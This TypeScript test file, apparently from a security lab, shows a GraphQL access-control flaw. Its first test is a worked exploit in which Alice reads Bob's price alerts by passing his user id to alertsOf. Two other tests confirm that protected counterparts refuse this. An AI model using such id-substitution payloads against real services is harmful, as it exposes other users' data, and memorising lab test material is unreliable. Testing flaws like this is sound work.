import {
  errorCode,
  graphql,
  request,
  runSecret,
  sessionToken,
  type ServiceHandle,
} from '@zazzles/exchange-testing';
import { startNotificationsService } from '../support/service.js';

// ACCESS-006: one payload, another user's id, sent to the vulnerable
// operation and to each protected counterpart.
const JWT_SECRET = runSecret();
const SERVICE_TOKEN = runSecret();

let service: ServiceHandle;

const alice = () =>
  sessionToken(JWT_SECRET, { sub: 'u-alice', sid: 's', role: 'USER' });
const bob = () =>
  sessionToken(JWT_SECRET, { sub: 'u-bob', sid: 's', role: 'USER' });
const admin = () =>
  sessionToken(JWT_SECRET, { sub: 'u-admin', sid: 's', role: 'ADMIN' });

beforeAll(async () => {
  process.env.JWT_SECRET = JWT_SECRET;
  process.env.INTERNAL_SERVICE_TOKEN = SERVICE_TOKEN;
  service = await startNotificationsService();
}, 300_000);

afterAll(async () => {
  await service?.stop();
});

const reset = () =>
  request(`${service.url}/internal/lab/reset`, {
    method: 'POST',
    headers: { 'x-internal-token': SERVICE_TOKEN },
  });

const query = (
  source: string,
  options: { token?: string; variables?: Record<string, unknown> } = {},
) => graphql(`${service.url}/graphql`, source, options);

describe("ACCESS-006: another user's alerts by id", () => {
  // One attacker value: the id of a user who is not the caller. Bob's
  // seeded alert is ETH-USD BELOW 3000.00, Alice's own is BTC-USD.
  const userId = 'u-bob';
  const bobsAlert = {
    userId: 'u-bob',
    symbol: 'ETH-USD',
    direction: 'BELOW',
    threshold: '3000.00',
  };

  test("the exploit: alertsOf answers Bob's alerts to Alice", async () => {
    await reset();

    const answer = await query(
      'query($userId: ID!) { alertsOf(userId: $userId) { id userId symbol direction threshold label enabled } }',
      { token: alice(), variables: { userId } },
    );

    // What was gained: another user's alerts, read by naming his id.
    expect(answer.errors).toBeUndefined();
    const gained = (answer.data as { alertsOf?: unknown }).alertsOf as {
      userId: string;
      symbol: string;
      direction: string;
      threshold: string;
    }[];
    expect(gained).toEqual([
      expect.objectContaining({ ...bobsAlert, label: 'Buy the dip' }),
    ]);
  });

  test("counterpart 1: alerts answers only the caller's own, and has no userId argument", async () => {
    await reset();

    const own = await query(
      '{ alerts { id userId symbol direction threshold label enabled } }',
      { token: alice() },
    );

    // Why it was refused: the caller's own list holds only her alert.
    expect(own.errors).toBeUndefined();
    const list = (own.data as { alerts?: unknown }).alerts as {
      userId: string;
      symbol: string;
      direction: string;
      threshold: string;
    }[];
    expect(list).toEqual([
      expect.objectContaining({
        userId: 'u-alice',
        symbol: 'BTC-USD',
        direction: 'ABOVE',
        threshold: '70000.00',
      }),
    ]);
    expect(list.some((alert) => alert.userId === userId)).toBe(false);

    // And there is no argument that could name another user.
    const withArgument = await query(
      'query($userId: ID!) { alerts(userId: $userId) { id } }',
      { token: alice(), variables: { userId } },
    );
    expect(errorCode(withArgument)).toBe('GRAPHQL_VALIDATION_FAILED');
    expect(withArgument.errors?.[0]?.message).toContain('userId');
  });

  test("counterpart 2: User.alerts refuses Alice on Bob's representation; Bob and an administrator are answered", async () => {
    await reset();

    const source =
      'query($representations: [_Any!]!) { _entities(representations: $representations) { ... on User { alerts { id userId symbol direction threshold label enabled } } } }';
    const representations = [{ __typename: 'User', id: userId }];

    // Why it was refused: the field is the caller's own user, or an
    // administrator's, whoever the representation names.
    const refused = await query(source, {
      token: alice(),
      variables: { representations },
    });
    expect(errorCode(refused)).toBe('FORBIDDEN');

    const alertsOfEntities = async (
      token: string,
    ): Promise<
      { userId: string; symbol: string; direction: string; threshold: string }[]
    > => {
      const answer = await query(source, {
        token,
        variables: { representations },
      });
      expect(answer.errors).toBeUndefined();
      const entities = (answer.data as { _entities?: unknown })._entities as {
        alerts: unknown;
      }[];
      return entities[0]!.alerts as {
        userId: string;
        symbol: string;
        direction: string;
        threshold: string;
      }[];
    };

    expect(await alertsOfEntities(bob())).toEqual([
      expect.objectContaining({ ...bobsAlert, label: 'Buy the dip' }),
    ]);
    expect(await alertsOfEntities(admin())).toEqual([
      expect.objectContaining({ ...bobsAlert, label: 'Buy the dip' }),
    ]);
  });
});
